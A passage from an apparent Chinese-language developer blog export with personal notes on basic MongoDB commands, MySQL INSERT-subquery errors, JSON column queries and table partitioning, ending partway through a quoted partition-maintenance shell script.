title=\"簡單架設 MonogoDB\"></a>簡單架設 MonogoDB</h2><h3 id=\"docker-架設\"><a href=\"#docker-架設\" class=\"headerlink\" title=\"docker 架設\"></a>docker 架設</h3><p><a href=\"https://hub.docker.com/_/mongo\" target=\"_blank\" rel=\"noopener\">參考裡面 docker-compose.yml</a></p>\n<h3 id=\"vagrant\"><a href=\"#vagrant\" class=\"headerlink\" title=\"vagrant\"></a>vagrant</h3><p>homestead 可以架設</p>\n<p>或者比較單純<a href=\"https://app.vagrantup.com/benson/boxes/mongodb\" target=\"_blank\" rel=\"noopener\">Vagrant box benson/mongodb - Vagrant Cloud</a> 或 <a href=\"https://github.com/bobthecow/vagrant-mongobox/issues/5\" target=\"_blank\" rel=\"noopener\">Update to Mongo v3 · Issue #5 · bobthecow/vagrant-mongobox</a></p>\n<h2 id=\"操作使用\"><a href=\"#操作使用\" class=\"headerlink\" title=\"操作使用\"></a>操作使用</h2><h3 id=\"local-config-admin-databases\"><a href=\"#local-config-admin-databases\" class=\"headerlink\" title=\"local,config,admin databases\"></a>local,config,admin databases</h3><p>預設安裝完會看到有三個 database<br><code>local</code>,<code>config</code>,<code>admin</code> 三個 database 建議不要去動他</p>\n<blockquote>\n<p>admin and local contain various settings local to the server, like users who are authenticated to connect. Under beginner usage, you shouldn’t need to worry about them at all. By default you connect to a database named test. To connect to a new database, just use databasename from the mongo command line, or mongo databasename from your OS shell.<br>use [database_name] and then show collections<br>The db object is your root handle to the currently-selected database on the mongo commmand line. The command line is really just a Javascript command line, and there are various mongodb-specific objects and functions exposed that let you do stuff. Try help() for a full listing.</p>\n</blockquote>\n<p><a href=\"https://stackoverflow.com/questions/3490272/some-beginners-questions-about-mongodb\" target=\"_blank\" rel=\"noopener\">Some beginner’s questions about MongoDB - Stack Overflow</a><br><a href=\"http://www.mongoing.com/archives/2599\" target=\"_blank\" rel=\"noopener\">MongoDB 管理：慎用 local、admin 数据库 | MongoDB 中文社区</a></p>\n<h2 id=\"mysql-lt-gt-mongodb\"><a href=\"#mysql-lt-gt-mongodb\" class=\"headerlink\" title=\"mysql &lt;=&gt; mongodb\"></a>mysql &lt;=&gt; mongodb</h2><p>MySQL MongoDB<br>Table &lt;==&gt; Collection<br>Row &lt;=&gt; Document<br>Column &lt;=&gt; Field</p>\n<p><a href=\"https://www.mongodb.com/compare/mongodb-mysql\" target=\"_blank\" rel=\"noopener\">MongoDB and MySQL Compared | MongoDB</a></p>\n<h2 id=\"操作使用-1\"><a href=\"#操作使用-1\" class=\"headerlink\" title=\"操作使用\"></a>操作使用</h2><h3 id=\"創建資料庫\"><a href=\"#創建資料庫\" class=\"headerlink\" title=\"創建資料庫\"></a>創建資料庫</h3><p><code>use DATABASE_NAME</code></p>\n<p>如果資料庫不存在，則創建資料庫，否則切換到指定資料庫。</p>\n<h3 id=\"刪除資料庫\"><a href=\"#刪除資料庫\" class=\"headerlink\" title=\"刪除資料庫\"></a>刪除資料庫</h3><p><code>db.dropDatabase()</code></p>\n<p>刪除所在的 Database</p>\n<h3 id=\"创建集合-Collection\"><a href=\"#创建集合-Collection\" class=\"headerlink\" title=\"创建集合(Collection)\"></a>创建集合(Collection)</h3><p><code>db.createCollection(name, options)</code></p>\n<p><code>db.createCollection(&quot;mycol&quot;, { capped : true, autoIndexId : true, size : 6142800, max : 10000 }</code><br>創建固定集合 mycol，整個集合空間大小 6142800 KB, 文檔最大個數為 10000 個。</p>\n<h3 id=\"插入文件-Document\"><a href=\"#插入文件-Document\" class=\"headerlink\" title=\"插入文件(Document)\"></a>插入文件(Document)</h3><p><code>db.COLLECTION_NAME.insert(document)</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">db.col.insert(&#123;</span><br><span class=\"line\">  title: <span class=\"string\">\"MongoDB 教程\"</span>,</span><br><span class=\"line\">  description: <span class=\"string\">\"MongoDB 是一個 Nosql 數據庫\"</span>,</span><br><span class=\"line\">  by: <span class=\"string\">\"菜鳥教程\"</span>,</span><br><span class=\"line\">  url: <span class=\"string\">\"http://www.runoob.com\"</span>,</span><br><span class=\"line\">  tags: [<span class=\"string\">\"mongodb\"</span>, <span class=\"string\">\"database\"</span>, <span class=\"string\">\"NoSQL\"</span>],</span><br><span class=\"line\">  likes: <span class=\"number\">100</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h3 id=\"查詢集合\"><a href=\"#查詢集合\" class=\"headerlink\" title=\"查詢集合\"></a>查詢集合</h3><p><code>db.col.find()</code></p>\n<h3 id=\"刪除文件\"><a href=\"#刪除文件\" class=\"headerlink\" title=\"刪除文件\"></a>刪除文件</h3><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">db.collection.remove(</span><br><span class=\"line\">   &lt;query&gt;,</span><br><span class=\"line\">   &lt;justOne&gt;</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://www.runoob.com/mongodb/mongodb-remove.html\" target=\"_blank\" rel=\"noopener\">MongoDB 刪除文檔 | 菜鳥教程</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">remove() 方法已經過時了，現在官方推薦使用 deleteOne() 和 deleteMany() 方法。</span><br><span class=\"line\"></span><br><span class=\"line\">如刪除集合下全部文檔：</span><br><span class=\"line\"></span><br><span class=\"line\">db.inventory.deleteMany(&#123;&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">刪除 status 等於 A 的全部文檔：</span><br><span class=\"line\"></span><br><span class=\"line\">db.inventory.deleteMany(&#123; status : &quot;A&quot; &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">刪除 status 等於 D 的一個文檔：</span><br><span class=\"line\"></span><br><span class=\"line\">db.inventory.deleteOne( &#123; status: &quot;D&quot; &#125; )</span><br><span class=\"line\"></span><br><span class=\"line\">三國電視台</span><br><span class=\"line\"></span><br><span class=\"line\">   三國電視台</span><br><span class=\"line\"></span><br><span class=\"line\">  tre***3@126.com</span><br><span class=\"line\">2年前 (2017-09-22)</span><br><span class=\"line\"></span><br><span class=\"line\">   sairre</span><br><span class=\"line\"></span><br><span class=\"line\">  jsa***e@163.com</span><br><span class=\"line\"></span><br><span class=\"line\">remove() 方法 並不會真正釋放空間。</span><br><span class=\"line\"></span><br><span class=\"line\">需要繼續執行 db.repairDatabase() 來回收磁盤空間。</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; db.repairDatabase()</span><br><span class=\"line\">或者</span><br><span class=\"line\">&gt; db.runCommand(&#123; repairDatabase: 1 &#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"修改文件\"><a href=\"#修改文件\" class=\"headerlink\" title=\"修改文件\"></a>修改文件</h3><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">db.collection.update(</span><br><span class=\"line\">   &lt;query&gt;,</span><br><span class=\"line\">   &lt;update&gt;,</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     upsert: <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">boolean</span>&gt;</span>,</span></span><br><span class=\"line\">     multi: &lt;boolean&gt;,</span><br><span class=\"line\">     writeConcern: &lt;document&gt;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">在3.2版本开始，MongoDB提供以下更新集合文档的方法：</span><br><span class=\"line\"></span><br><span class=\"line\">    db.collection.updateOne() 向指定集合更新单个文档</span><br><span class=\"line\">    db.collection.updateMany() 向指定集合更新多个文档</span><br></pre></td></tr></table></figure>\n<p>更多內容可看<a href=\"http://www.runoob.com/mongodb/mongodb-tutorial.html\" target=\"_blank\" rel=\"noopener\">MongoDB 教程 | 菜鸟教程</a><br>由於裡面教學應該是 2.x 版<br>可以看評論裡面補充很多東西</p>\n<h2 id=\"Robo-3T-操作-MongoDB\"><a href=\"#Robo-3T-操作-MongoDB\" class=\"headerlink\" title=\"Robo 3T 操作 MongoDB\"></a>Robo 3T 操作 MongoDB</h2><p><a href=\"https://www.cnblogs.com/tugenhua0707/p/9250673.html\" target=\"_blank\" rel=\"noopener\">MongoDB 可视化工具–Robo 3T 使用教程 - 龙恩 0707 - 博客园</a><br><a href=\"https://adminmongo.markmoffat.com/\" target=\"_blank\" rel=\"noopener\">adminMongo</a></p>\n<h2 id=\"刪除資料-OR-篩選資料-的問題\"><a href=\"#刪除資料-OR-篩選資料-的問題\" class=\"headerlink\" title=\"刪除資料 OR 篩選資料 的問題\"></a>刪除資料 OR 篩選資料 的問題</h2><p><a href=\"https://kknews.cc/zh-tw/news/kyyva3q.html\" target=\"_blank\" rel=\"noopener\">「乾貨」mongoDB 釋放磁碟占用 - 每日頭條</a><br>目前專案裡面放的資料好像不會去做刪除或者撈出來資料不會做篩選<br>不知道是不是非常耗效能關係??</p>\n","categories":["MongoDB"],"tags":["monogodb"]},{"title":"MySQL(MariaDB) insert有關做相同表會遇到問題小記","url":"/blog/2019/06/02/MySQL-MariaDB-insert%E6%9C%89%E9%97%9C%E5%81%9A%E7%9B%B8%E5%90%8C%E8%A1%A8%E6%9C%83%E9%81%87%E5%88%B0%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98/","content":"<p>最近做 INSERT 很簡單語法<br>但竟然出錯<br>印象中 DB2 以前這樣下沒有這個問題<br>錯誤訊息如下：<br><code>Table &#39;test&#39; is specified twice, both as a target for &#39;INSERT&#39; and as a separate source for data</code><br><code>You can&#39;t specify target table &#39;basic_data&#39; for update in FROM clause</code><br>ex:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> data_waktu_vaksinasi (id_binatang, id_vaksin, tanggal_vaksin, status_vaksin) <span class=\"keyword\">VALUES</span></span><br><span class=\"line\">    (<span class=\"number\">1</span>, <span class=\"number\">1</span>, (<span class=\"keyword\">SELECT</span> <span class=\"keyword\">DATE_ADD</span>(<span class=\"keyword\">max</span>(tanggal_vaksin), <span class=\"built_in\">INTERVAL</span> <span class=\"number\">1</span> <span class=\"keyword\">YEAR</span>)) <span class=\"keyword\">FROM</span> data_waktu_vaksinasi, <span class=\"string\">'belum'</span>)</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<p>爬了一些網站有找到解法<br><a href=\"https://blog.csdn.net/winter13292/article/details/8628953\" target=\"_blank\" rel=\"noopener\">解决 mysql 不能修改（You can’t specify target table ‘basic_data’ for update in FROM clause） - winter13292 的专栏 - CSDN 博客</a><br><a href=\"https://stackoverflow.com/questions/34839842/table-is-specified-twice-both-as-a-target-for-insert-and-as-separate-source-of-d\" target=\"_blank\" rel=\"noopener\">mysql - table is specified twice both as a target for INSERT and as separate source of data - Stack Overflow</a><br><a href=\"https://stackoverflow.com/questions/47165521/1093-error-in-mysql-table-is-specified-twice?rq=1\" target=\"_blank\" rel=\"noopener\">1093 Error in MySQL table is specified twice - Stack Overflow</a></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> data_waktu_vaksinasi (id_binatang, id_vaksin, tanggal_vaksin, status_vaksin)</span><br><span class=\"line\">     <span class=\"keyword\">SELECT</span> <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"keyword\">DATE_ADD</span>(<span class=\"keyword\">max</span>(tanggal_vaksin), <span class=\"built_in\">INTERVAL</span> <span class=\"number\">1</span> <span class=\"keyword\">YEAR</span>), <span class=\"string\">'belum'</span></span><br><span class=\"line\">     <span class=\"keyword\">FROM</span> data_waktu_vaksinasi;</span><br></pre></td></tr></table></figure>\n<p>或外面包一個 <code>SELECT</code><br><a href=\"https://blog.csdn.net/winter13292/article/details/8628953\" target=\"_blank\" rel=\"noopener\">解决 mysql 不能修改（You can’t specify target table ‘basic_data’ for update in FROM clause） - winter13292 的专栏 - CSDN 博客</a></p>\n<p>也有看到 join 方式解決<br><a href=\"https://blog.csdn.net/weixin_42608550/article/details/89644418\" target=\"_blank\" rel=\"noopener\">mysql: you can’t specify target table 问题解决 - weixin_42608550 的博客 - CSDN 博客</a></p>\n<p>其他小記<br><a href=\"https://blog.csdn.net/tjcyjd/article/details/8950621\" target=\"_blank\" rel=\"noopener\">如何去掉数据库重复记录并且只保留一条记录 - Java 高知 - CSDN 博客</a></p>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"MySQL / MariaDB 查詢 JSON 資料小記","url":"/blog/2019/09/03/MySQL-MariaDB-%E6%9F%A5%E8%A9%A2-JSON-%E8%B3%87%E6%96%99%E5%B0%8F%E8%A8%98/","content":"<p>最近剛好要撈出某一台 DB 特別的值<br>但那個欄位都是 JSON 格式<br>剛好那台 DB 是 MySQL 5.7.x<br>可以用 JSON，就趁個這個機會做筆記</p>\n<a id=\"more\"></a>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">-- example</span></span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.uid'</span> <span class=\"keyword\">AS</span> uid <span class=\"keyword\">FROM</span> xxx <span class=\"keyword\">where</span> <span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.uid'</span> <span class=\"keyword\">IN</span> (</span><br><span class=\"line\">    xxxx</span><br><span class=\"line\">)<span class=\"keyword\">and</span> <span class=\"keyword\">time</span> <span class=\"keyword\">BETWEEN</span> <span class=\"string\">'2019-07-09 00:00:00'</span> <span class=\"keyword\">and</span> <span class=\"string\">'2019-07-09 23:59:59'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 暫時撈資料跑報表</span></span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">type</span>,pl_id,<span class=\"keyword\">count</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> (</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.uid'</span> <span class=\"keyword\">as</span> uid,<span class=\"string\">'2'</span> <span class=\"keyword\">as</span> <span class=\"keyword\">type</span>,<span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.playtrackId'</span> <span class=\"keyword\">AS</span> pl_id, <span class=\"keyword\">time</span>  <span class=\"keyword\">FROM</span> log_table <span class=\"keyword\">where</span> <span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.uid'</span> = <span class=\"string\">'xxxxxx'</span> <span class=\"keyword\">and</span> <span class=\"keyword\">time</span> <span class=\"keyword\">between</span> <span class=\"string\">'2019-07-09 00:00:00'</span> <span class=\"keyword\">and</span> <span class=\"string\">'2019-07-09 23:59:59'</span></span><br><span class=\"line\"><span class=\"keyword\">UNION</span> ALL</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.uid'</span> <span class=\"keyword\">AS</span> uid,<span class=\"string\">'2'</span> <span class=\"keyword\">as</span> <span class=\"keyword\">type</span>,<span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.playtrackId'</span> <span class=\"keyword\">AS</span> pl_id, <span class=\"keyword\">time</span>  <span class=\"keyword\">FROM</span> log_table <span class=\"keyword\">where</span> <span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.uid'</span> = <span class=\"string\">'oooooo'</span> <span class=\"keyword\">and</span> <span class=\"keyword\">time</span> <span class=\"keyword\">between</span> <span class=\"string\">'2019-07-09 00:00:00'</span> <span class=\"keyword\">and</span> <span class=\"string\">'2019-07-09 23:59:59'</span></span><br><span class=\"line\"><span class=\"keyword\">UNION</span> ALL</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.uid'</span> <span class=\"keyword\">AS</span> uid,<span class=\"string\">'2'</span> <span class=\"keyword\">as</span> <span class=\"keyword\">type</span>,<span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.playtrackId'</span> <span class=\"keyword\">AS</span> pl_id, <span class=\"keyword\">time</span>  <span class=\"keyword\">FROM</span> log_table <span class=\"keyword\">where</span> <span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.uid'</span> = <span class=\"string\">'aaaaaa'</span> <span class=\"keyword\">and</span> <span class=\"keyword\">time</span> <span class=\"keyword\">between</span> <span class=\"string\">'2019-07-09 00:00:00'</span> <span class=\"keyword\">and</span> <span class=\"string\">'2019-07-09 23:59:59'</span></span><br><span class=\"line\"><span class=\"keyword\">UNION</span> ALL</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.uid'</span> <span class=\"keyword\">AS</span> uid,<span class=\"string\">'2'</span> <span class=\"keyword\">as</span> <span class=\"keyword\">type</span>,<span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.playtrackId'</span> <span class=\"keyword\">AS</span> pl_id, <span class=\"keyword\">time</span>  <span class=\"keyword\">FROM</span> log_table <span class=\"keyword\">where</span> <span class=\"keyword\">log</span>-&gt;<span class=\"string\">'$.uid'</span> = <span class=\"string\">'zzzzzz'</span> <span class=\"keyword\">and</span> <span class=\"keyword\">time</span> <span class=\"keyword\">between</span> <span class=\"string\">'2019-07-09 00:00:00'</span> <span class=\"keyword\">and</span> <span class=\"string\">'2019-07-09 23:59:59'</span></span><br><span class=\"line\">)  aa</span><br><span class=\"line\"><span class=\"keyword\">group</span> <span class=\"keyword\">by</span> <span class=\"keyword\">type</span>,pl_id</span><br></pre></td></tr></table></figure>\n<p>最後發現 JSON 字串前後會帶<code>&quot;</code><br>可以用<code>JSON_UNQUOTE</code></p>\n<p>MariaDB 也可以使用，不過我目前沒有用到<br>下方聯結有更詳細介紹<br><a href=\"http://www.lnmp.cn/mysql-57-new-features-json.html\" target=\"_blank\" rel=\"noopener\">MySQL 5.7 新特性 JSON 的创建，插入，查询，更新</a> <a href=\"/blog/2019/09/03/MySQL-MariaDB-查詢-JSON-資料小記/web1.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://blog.51cto.com/hcymysql/1694181\" target=\"_blank\" rel=\"noopener\">MariaDB 10.0.X中，动态列支持 JSON 格式来获取数据。 -贺春旸的技术博客-51CTO博客</a> <a href=\"/blog/2019/09/03/MySQL-MariaDB-查詢-JSON-資料小記/web2.png\" title=\"備份圖\">備份圖</a></p>\n<p>之後還有用到實用的方法再補充</p>\n","categories":["MySQL"],"tags":["mysql","mariadb","json"]},{"title":"MySQL Partition 小記","url":"/blog/2019/06/25/MySQL-Partition-%E5%B0%8F%E8%A8%98/","content":"<p>最近接觸一點 Partition<br>但這個東西不是很熟悉<br>所以小記一些東西(都是網路上找的)</p>\n<a id=\"more\"></a>\n<h2 id=\"主鍵和-Parition\"><a href=\"#主鍵和-Parition\" class=\"headerlink\" title=\"主鍵和 Parition\"></a>主鍵和 Parition</h2><p><code>1503 - A PRIMARY KEY must include all columns in the table&#39;s partitioning function</code><br><a href=\"https://www.cnblogs.com/zhishan/p/3285055.html\" target=\"_blank\" rel=\"noopener\">MYSQL 的分区字段，必须包含在主键字段内 - 王 庆 - 博客园</a></p>\n<p><strong>2019-08-26 小記</strong><br>要把 patition 的欄位加到 PRIMARY KEY</p>\n<blockquote>\n<p>簡單說說我的看法<br><strong>partition 用到的欄位要加進去 primary key</strong><br>這樣切的 partition 時需要注意<br>不常用就會忘記</p>\n</blockquote>\n<p>今天，發現用 MySQL 子查詢 partition table<br>explain 發現會吃免一個 partition </p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> </span><br><span class=\"line\">xxx,</span><br><span class=\"line\">(<span class=\"keyword\">SELECT</span> <span class=\"keyword\">count</span>(<span class=\"number\">1</span>) <span class=\"keyword\">FROM</span> xxxx <span class=\"keyword\">WHERE</span> <span class=\"keyword\">id</span> = a.id) <span class=\"keyword\">as</span> <span class=\"keyword\">count</span></span><br><span class=\"line\"><span class=\"keyword\">FROM</span> a</span><br><span class=\"line\"><span class=\"keyword\">where</span> <span class=\"keyword\">id</span> = <span class=\"string\">'xxx'</span></span><br></pre></td></tr></table></figure>\n<p>目前不確定是不是因為 id 為字串關系<br>但目前系統查詢還不會很慢</p>\n<p><a href=\"https://kknews.cc/other/mjzoq52.html\" target=\"_blank\" rel=\"noopener\">MySQL 之 KEY 分區引發的血案 - 每日頭條</a></p>\n<h2 id=\"SQL-查詢-Partition-語法\"><a href=\"#SQL-查詢-Partition-語法\" class=\"headerlink\" title=\"SQL 查詢 Partition 語法\"></a>SQL 查詢 Partition 語法</h2><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> information_schema.partitions <span class=\"keyword\">WHERE</span> TABLE_SCHEMA=<span class=\"string\">'your_database'</span> <span class=\"keyword\">AND</span> TABLE_NAME = <span class=\"string\">'your_table'</span> <span class=\"keyword\">AND</span> PARTITION_NAME <span class=\"keyword\">IS</span> <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/8700613/are-the-mysql-partitions-visible-in-the-explain-plan-of-a-select\" target=\"_blank\" rel=\"noopener\">Are the MySQL Partitions visible in the EXPLAIN plan of a SELECT….? - Stack Overflow</a></p>\n<h2 id=\"EXPLAIN-沒有出現-Partition\"><a href=\"#EXPLAIN-沒有出現-Partition\" class=\"headerlink\" title=\"EXPLAIN 沒有出現 Partition\"></a>EXPLAIN 沒有出現 Partition</h2><p>用<code>EXPLAIN PARTITIONS</code></p>\n<p><a href=\"https://stackoverflow.com/questions/8700613/are-the-mysql-partitions-visible-in-the-explain-plan-of-a-select\" target=\"_blank\" rel=\"noopener\">Are the MySQL Partitions visible in the EXPLAIN plan of a SELECT….? - Stack Overflow</a></p>\n<p><a href=\"https://stackoverflow.com/questions/25508419/how-to-view-information-of-partitions-in-a-table\" target=\"_blank\" rel=\"noopener\">mysql - How to view information of partitions in a table? - Stack Overflow</a></p>\n<h2 id=\"Partition-分配不均的問題\"><a href=\"#Partition-分配不均的問題\" class=\"headerlink\" title=\"Partition 分配不均的問題\"></a>Partition 分配不均的問題</h2><p>用質數，我也沒有實驗過…<br><a href=\"https://kknews.cc/other/mjzoq52.html\" target=\"_blank\" rel=\"noopener\">MySQL 之 KEY 分區引發的血案 - 每日頭條</a> <a href=\"/blog/2019/06/25/MySQL-Partition-小記/2.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://bbs.csdn.net/topics/390857704\" target=\"_blank\" rel=\"noopener\">mysql 中的 key 分区为什么总是一半有数据，一半没有数据？-CSDN 论坛</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">如果設置40，64，128等偶數個分區數（PARTITIONS 64），會導致編號為奇數的分區（p1, p3, p5, p7, ... p2n-1）完全插不進數據；</span><br><span class=\"line\">如果設置63，121（PARTITIONS 63）這種奇數但非質數個分區數，所有分區都會有數據，但是不均勻；</span><br><span class=\"line\">如果設置137，31這種質數個分區數（PARTITIONS 137），所有分區都會有數據，並且非常均勻；</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">原文網址：https://kknews.cc/other/mjzoq52.html</span><br></pre></td></tr></table></figure>\n<h2 id=\"KEY-amp-Hash-差異\"><a href=\"#KEY-amp-Hash-差異\" class=\"headerlink\" title=\"KEY &amp; Hash 差異\"></a>KEY &amp; Hash 差異</h2><p><a href=\"https://www.cnblogs.com/ivictor/p/5033708.html\" target=\"_blank\" rel=\"noopener\">MySQL 分区总结 - iVictor - 博客园</a></p>\n<p>看不是很懂，Hash 不能重覆,Key 可以??? 等研究出來再補</p>\n<h2 id=\"手建和內建-Partition-差別\"><a href=\"#手建和內建-Partition-差別\" class=\"headerlink\" title=\"手建和內建 Partition 差別\"></a>手建和內建 Partition 差別</h2><blockquote>\n<p>手工分表 VS 分區表<br>手工分表的邏輯，找到所有需要更新的分表，然後依次更新，在性能上，與分區表並沒有實質的差別<br>分區表由 Server 層決定使用哪個分區，手工分表由應用代碼決定使用哪一個分表</p>\n</blockquote>\n<p><a href=\"http://zhongmingmao.me/2019/03/17/mysql-partition-table/\" target=\"_blank\" rel=\"noopener\">MySQL – 分区表 | 点滴积累</a> <a href=\"/blog/2019/06/25/MySQL-Partition-小記/1.png\" title=\"備份圖\">備份圖</a></p>\n<h2 id=\"UUID-主鍵-vs-流水號-主鍵\"><a href=\"#UUID-主鍵-vs-流水號-主鍵\" class=\"headerlink\" title=\"UUID 主鍵 vs 流水號 主鍵\"></a>UUID 主鍵 vs 流水號 主鍵</h2><p><a href=\"https://blog.csdn.net/chuixue24/article/details/90449075\" target=\"_blank\" rel=\"noopener\">MySQL 使用自增 ID 主键和 UUID 作为主键的优劣比较详细过程（从百万到千万表记录测试） - chuixue24 的博客 - CSDN 博客</a></p>\n<h2 id=\"不是每張表適合做-Partition\"><a href=\"#不是每張表適合做-Partition\" class=\"headerlink\" title=\"不是每張表適合做 Partition\"></a>不是每張表適合做 Partition</h2><p>也看 SQL 語句，通常要看所有 WHERE 條件資料依照做切割</p>\n<h2 id=\"刪除-Partition-會有資料消失\"><a href=\"#刪除-Partition-會有資料消失\" class=\"headerlink\" title=\"刪除 Partition 會有資料消失??!\"></a>刪除 Partition 會有資料消失??!</h2><p>phpmyadmin 可以做刪除動作!!但發現會有少資料</p>\n<p>解決方法</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> xxxxxx <span class=\"keyword\">rename</span> <span class=\"keyword\">TO</span> old_20170101_xxxxxx;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> <span class=\"string\">`xxxxxx`</span> (</span><br><span class=\"line\">ooooo</span><br><span class=\"line\">) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">InnoDB</span> <span class=\"keyword\">DEFAULT</span> <span class=\"keyword\">CHARSET</span>=utf8</span><br><span class=\"line\">;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> xxxxxx <span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> old_20170101_xxxxxx;</span><br></pre></td></tr></table></figure>\n<p>不過為什麼會少資料還沒有找到原因</p>\n<h2 id=\"自動建立-Partition\"><a href=\"#自動建立-Partition\" class=\"headerlink\" title=\"自動建立 Partition\"></a>自動建立 Partition</h2><ul>\n<li><a href=\"http://www.itpub.net/thread-1417474-1-1.html\" target=\"_blank\" rel=\"noopener\">通过shell脚本自动增加mysql分区表的分区 - MySQL及其它开源数据库 - ITPUB论坛－中国专业的IT技术社区</a></li>\n</ul>\n<details><br>  <summary>本文備份</summary><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#!/bin/sh</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\">:&lt;&lt;BLOCK</span><br><span class=\"line\">######################################################################</span><br><span class=\"line\">SHELL_NAME：Logdb_Add_Partition.sh</span><br><span class=\"line\">  Functional Description：At the last month auto add the logdb table partition</span><br><span class=\"line\">    Argument：</span><br><span class=\"line\"></span><br><span class=\"line\">            $1 USER Mysql Account</span><br><span class=\"line\">            $2 PASS Mysql Account Pass</span><br><span class=\"line\">            $3 DB        Mysql Logdb</span><br><span class=\"line\">    Version：V1.0</span><br><span class=\"line\">    Creater : SongYunkui</span><br><span class=\"line\">              Colin_Song</span><br><span class=\"line\">    Crete_time：2010/12/9</span><br><span class=\"line\">    Modify：1. MODIFY BY</span><br><span class=\"line\">            2. ADD BY ____ ___/__/__ Add:_________</span><br><span class=\"line\">######################################################################            </span><br><span class=\"line\">BLOCK</span><br><span class=\"line\"></span><br><span class=\"line\">#######################################################################################</span><br><span class=\"line\">if [ $# -lt 3 ]; then</span><br><span class=\"line\">  echo &quot;Please Input The Correct Args&quot;</span><br><span class=\"line\">  echo &quot;Usage Logdb_Add_Partition.sh &lt;USER&gt; &lt;PASS&gt; &lt;DB&gt;&quot;</span><br><span class=\"line\">  exit -1</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\">USER=$1</span><br><span class=\"line\">PASS=$2</span><br><span class=\"line\">DB=$3</span><br><span class=\"line\"></span><br><span class=\"line\">##config section begin</span><br><span class=\"line\">CONN_MYSQL=&quot;-u$USER -p$PASS -s&quot;</span><br><span class=\"line\">MYSQL_HOME=/opt/modules/mysql</span><br><span class=\"line\">MYSQL_DIR=$&#123;MYSQL_HOME&#125;/bin/mysql</span><br><span class=\"line\">SHELL_BASE=/opt/sbin/Logdb</span><br><span class=\"line\">LOG_DIR=$&#123;SHELL_BASE&#125;/log</span><br><span class=\"line\">OPT_NAME=add_partition</span><br><span class=\"line\"></span><br><span class=\"line\">MKDIR=`whereis -b mkdir|awk &apos;&#123;print $2&#125;&apos;`</span><br><span class=\"line\">TOUCH=`whereis -b touch|awk &apos;&#123;print $2&#125;&apos;`</span><br><span class=\"line\">DATE=`whereis -b date|awk &apos;&#123;print $2&#125;&apos;`</span><br><span class=\"line\">if [ ! -d $&#123;SHELL_BASE&#125; ]</span><br><span class=\"line\">then</span><br><span class=\"line\">    $&#123;MKDIR&#125; -p $&#123;SHELL_BASE&#125;</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\">if [ ! -d 